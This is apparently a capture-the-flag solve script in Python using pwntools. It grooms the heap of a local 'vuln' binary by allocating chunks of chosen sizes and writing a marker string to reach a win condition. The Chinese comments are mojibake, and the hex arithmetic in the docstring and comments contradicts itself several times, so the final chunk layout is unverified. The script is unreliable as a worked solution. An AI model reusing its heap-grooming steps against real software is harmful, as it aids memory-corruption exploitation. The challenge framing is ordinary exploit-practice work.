#!/usr/bin/env python3
"""
Level 6: Heap Feng Shui - Solution (æœ€ç»ˆä¿®æ­£)

å®é™…åç§»åˆ†æï¼š
å½“å‰ [16, 32, 32, 32, 32, 64, 32, 32, 32, 16] = 0x1c0
éœ€è¦ 0x200
å·®å€¼ 0x40

ä¿®æ­£ï¼šå°†ä¸¤ä¸ª16å­—èŠ‚æ”¹ä¸º32å­—èŠ‚
[16, 32, 32, 32, 32, 64, 32, 32, 32, 16]
â†’ [16, 32, 64, 32, 32, 64, 32, 32, 32, 16]
= 0x20 + 0x30 + 0x50 + 3*0x30 + 0x50 + 3*0x30 + 0x20
= 0x20 + 0x30 + 0x50 + 0x90 + 0x50 + 0x90 + 0x20
= 0x200 âœ“
"""

from pwn import *
import time

context.log_level = 'info'

def solve():
    p = process('./vuln')

    def alloc(size):
        p.sendline(b'1')
        p.sendline(str(size).encode())
        time.sleep(0.01)

    def edit(idx, data):
        p.sendline(b'3')
        p.sendline(str(idx).encode())
        p.send(data + b'\n')
        time.sleep(0.01)

    # ç²¾ç¡®å¸ƒå±€ï¼šchunk[9] - chunk[0] = 0x200
    # å½“å‰ [16, 32, 64, 32, 32, 64, 32, 32, 32, 16] = 0x1e0 (è¿˜å·®0x20)
    # å°†æœ€åä¸€ä¸ª16å­—èŠ‚æ”¹ä¸º32å­—èŠ‚
    sizes = [16, 32, 64, 32, 32, 64, 32, 32, 32, 32]
    # = 0x20 + 0x30 + 0x50 + 3*0x30 + 0x50 + 4*0x30
    # = 0x20 + 0x30 + 0x50 + 0x90 + 0x50 + 0xc0
    # = 0x50 + 0x50 + 0x90 + 0x50 + 0xc0
    # = 0xa0 + 0x1a0 + 0xc0
    # = 0x240 + 0xc0
    # = 0x300 (ä¸å¯¹...)

    # è®©æˆ‘æ‰‹åŠ¨åŠ ï¼š
    # 0x20 + 0x30 + 0x50 + 0x30 + 0x30 + 0x50 + 0x30 + 0x30 + 0x30 + 0x30
    # = 0x50 + 0x50 + 0x30 + 0x30 + 0x50 + 0xc0
    # = 0xa0 + 0x60 + 0x50 + 0xc0
    # = 0x100 + 0x50 + 0xc0
    # = 0x150 + 0xc0
    # = 0x210 (è¶…å‡º0x10)

    # å»æ‰0x10ï¼ŒæŠŠä¸€ä¸ª32å­—èŠ‚æ”¹ä¸º16å­—èŠ‚
    sizes = [16, 32, 64, 32, 32, 64, 32, 32, 32, 16]  # è¿™ä¸ªæ˜¯0x1e0
    # æŠŠä¸­é—´æŸä¸ª32å­—èŠ‚æ”¹ä¸º64å­—èŠ‚ï¼Œå¢åŠ 0x20
    sizes = [16, 32, 64, 32, 32, 64, 64, 32, 32, 16]

    log.info("Step 1: Allocate 10 chunks with precise layout")
    for i, size in enumerate(sizes):
        alloc(size)
        log.info(f"chunk[{i}] size={size}")

    log.info("Step 2: Edit chunk[5] with 'FENG_SHUI'")
    edit(5, b'FENG_SHUI\x00')  # æ·»åŠ nullç»ˆæ­¢ç¬¦

    log.info("Step 3: Check win condition")
    p.sendline(b'5')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output or 'ğŸ¯' in output or 'ğŸ‰' in output:
        log.success("Level 6 è§£é¢˜æˆåŠŸï¼")
        return True
    else:
        log.failure("Level 6 è§£é¢˜å¤±è´¥")
        return False

if __name__ == '__main__':
    solve()
